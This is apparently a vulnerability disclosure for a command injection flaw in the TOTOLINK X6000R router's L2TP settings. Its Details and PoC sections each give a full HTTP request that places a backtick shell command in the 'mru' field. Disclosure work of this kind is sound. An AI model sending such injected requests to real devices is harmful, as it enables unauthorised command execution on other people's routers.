# Summary
There is a command execution vulnerability in TOTOLINK X6000R V9.4.0cu.852_B20230719(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/l2tp.html", and vulnerable paramter is **"mru"**.

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/f988b107-ec6e-4f29-8749-0e34f26d919b)

Capture the packet and do a blind test directly, we edit the value of `mru` to a command to execute:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=D526E9BD192CC73D HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 224
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/l2tp.html?token=D526E9BD192CC73D
Priority: u=1

{"enable":"1","sip":"10.8.0.2","eip":"10.8.0.51","server":"10.8.0.1","priDns":"8.8.8.8","secDns":"10.20.0.1","mtu":"1450","mru":"`ls >/web/poc_l2tp_mru.txt`","ipsecL2tpEnable":"0","ipsecPsk":"","topicurl":"setL2tpServerCfg"}
```
![image](https://github.com/user-attachments/assets/14adae47-e324-4425-a07d-e87551c7b8e5)

![image](https://github.com/user-attachments/assets/a2796fab-fc59-4a17-ab4f-453bd28f470b)


# PoC
Capture the packet and do a blind test directly, we edit the value of `mru` to a command to execute:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=D526E9BD192CC73D HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 224
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/l2tp.html?token=D526E9BD192CC73D
Priority: u=1

{"enable":"1","sip":"10.8.0.2","eip":"10.8.0.51","server":"10.8.0.1","priDns":"8.8.8.8","secDns":"10.20.0.1","mtu":"1450","mru":"`ls >/web/poc_l2tp_mru.txt`","ipsecL2tpEnable":"0","ipsecPsk":"","topicurl":"setL2tpServerCfg"}
```
![image](https://github.com/user-attachments/assets/14adae47-e324-4425-a07d-e87551c7b8e5)

![image](https://github.com/user-attachments/assets/a2796fab-fc59-4a17-ab4f-453bd28f470b)
